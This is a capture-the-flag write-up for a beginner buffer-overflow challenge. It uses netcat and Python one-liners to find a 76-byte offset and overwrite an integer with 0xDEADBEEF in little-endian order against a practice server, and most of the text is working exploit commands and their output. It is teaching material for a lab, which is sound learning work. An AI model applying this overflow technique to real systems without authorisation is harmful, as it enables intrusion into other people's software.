PWN Challenge
```
~$ nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input:
```

It is asking you to change the current value from 0 to 0xDEADBEEF.

There are two ways that we can input to this executable. From within the server or external to the server. For ease we go from outside the server.

Lets try and provide it with an answer, in this case 10 "A"s
```
~$ echo "AAAAAAAAAA" | nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input: 
Try again, you got 0x00000000
```

That failed. So again it is looking to change 0x00000000 to 0xDEADBEEF. Rather than keep typing out "A"s, we can use python.

```
:~$ python -c 'print "A" * 10' |nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input: 
Try again, you got 0x00000000
```

So that was not enough to overflow. Lets try some more - 50
```
:~$ python -c 'print "A" * 50' |nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input: 
Try again, you got 0x00000000
```

Nope, still not enough - how about 80?
```
:~$ python -c 'print "A" * 80' |nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input: 
Try again, you got 0x41414141
```

OK we are getting somewhere. We can see that our "A" code is starting to come through (leak) (0x41 is hex for A). So that means we are quite close. We need to now find at the point the "A" comes through.

Lets drop them to 77.
```
:~$ python -c 'print "A" *77' |nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input: 
Try again, you got 0x00000041
```

OK we see that a single A has leaked through, so if we take one off, the number is more likely to be 76. Lets try that.
```
:~$ python -c 'print "A" *76' |nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input: 
Try again, you got 0x00000000
```

Great so we know that anything over 76 will be read as the answer. We now need to get the 0xDEADBEEF into our line of code as part of the overflow.

```
~$ python -c 'print "A" *76 + "\xDE\xAD\xBE\xEF"' |nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input: 
Try again, you got 0xefbeadde
```

OK - So close. Something to be aware of are Big and Little Endians. We can see that the code in order to be correct (in this case) will have to be reversed (Little Endian System)

```
python -c 'print "A" *76 + "\xEF\xBE\xAD\xDE"' |nc pwn.ctf.ae 9810
Welcome to PWN 101!
The integer variable is currently equal to 0. Can you change it to 0xDEADBEEF?
Send input: 
Congrats! You successfully modified the variable!
The flag is: CTFAE{**************************}
```
There you have it, I hope you found this helpful.


